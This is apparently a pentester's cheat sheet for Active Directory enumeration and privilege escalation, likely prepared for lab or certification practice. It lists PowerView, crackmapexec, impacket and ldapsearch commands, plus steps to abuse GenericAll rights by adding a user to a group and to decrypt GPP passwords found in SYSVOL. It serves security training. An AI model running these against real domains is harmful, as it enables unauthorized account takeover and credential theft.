whoami  
• Get-History  
• (Get-PSReadlineOption).HistorySavePath  
• net user "username" (check for group membership)  
• Get-ADUser  
• Get-LocalUser  
• Get-LocalGroup  
• Get-LocalGroupMember "groupname"  
• route print  
• net user /domain  
• net user "username" /domain  
• net group /domain  
• net group "groupname" /domain (always check custom groups first)

RID = 500 (local administrator)

## Did you get any valid user creds? Don’t rush into bruteforce with cme or stuffs try,

```
impacket-GetADUsers -all -dc-ip IP domain.com/user
```

## To Identify Hostname and domain name
```
crackmapexec smb ip
```

## To Identify Users
```
crackmapexec smb ip --users  
crackmapexec smb ip -u '' --users  
crackmapexec smb ip -u '' -p '' --users
```

## ENUMERATION
```
./enumerate.ps1

Import-Module .\function.ps1
  
LDAPSearch -LDAPQuery "(samAccountType=805306368)" (LDAPSearch - declared function name)(Filtering samAccountType)

LDAPSearch -LDAPQuery "(objectclass=group)" (Search for Object Class to list all objects in Domain)

ldapsearch -h ip

ldapsearch -h ip -x -s base namingcontexts
   
ldapsearch -h ip -x -b "DC=htb,DC=local"'(objectClass=Person)'
    
ldapsearch -h ip -x -b "DC=htb,DC=local"'(objectClass=Person)'sAMAccountName
    
ldapsearch -h ip -x -b "DC=htb,DC=local"'(objectClass=Person)'sAMAccountName | grep sAMAccountName | awk'{print$2}' > users.ldap
```

## To Enumerate every group available in domain and query the users
```
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select{$_.cn},{$_.member}}
```

## To Enumerate Members in Specific group(i.e., Sales Department)
```
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=SalesDepartment))" 
$sales.properties.member
```
**Note**: Custom Scripts are more efficient than net.exe because net.exe enumerates user objects whereas the above AD scripts enumerate group objects.  
Nested Group- Group inside a group  
Always check nested groups as there might be a member in it who can be be admin user.

## Enumeration with PowerView
```
FileTransfer  
Import-Module .\PowerView.ps1 
Get-NetDomain
Get-NetUser  
Get-NetUser | select cn  
Get-NetUser | select cn,pwdlastset,lastlogon (If a user hasn't changed their password since a recent password policy change,their password may be weaker than the current policy. This might make it more vulnerable to password attacks.)  
Get-NetGroup | selectcn  
Get-NetGroup "groupname" | select member  
Get-NetComputer  
Get-NetComputer | select operatingsystem,dnshostname  
Get-NetComputer | ForEach-Object{$dnsName = $_.Name;$ipAddress = (Resolve-DnsName$_.Name | Where-Object{ $_.IPAddress -ne $null } | Select-Object -First 1).IPAddress; $_ | Select-Object OperatingSystem, DNSHostName, @{Name="IPAddress";Expression={$ipAddress}} }  

or

Resolve-DnsName PROD01.medtech.com | Select-Object -ExpandProperty IPAddress
```
## Enumerating Object Permissions
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights (Check if GenericAll is present)

"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5- 18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName (Convert the SID which has GenericAll set)

Note: Regular domain user should not have GenericAll permissions set if it is present  

net group "Management Department" stephanie /add /domain(adding the user which has GenericAll permissions set) 
Get-NetGroup "Management Department" | select member(Verify is user is added)  

net group "Management Department" stephanie /del /domain (Del the added user if needed)
```

## Enumerating Domain Shares
```
Find-DomainShare  
Find-DomainShare -CheckShareAccess (To list shares available to us) 
ls \\DC1\SYSVOL\ (domain \ share name)  
Found Passwords in Groups.xml or any other file ?  
gpp-decrypt "hash"
```
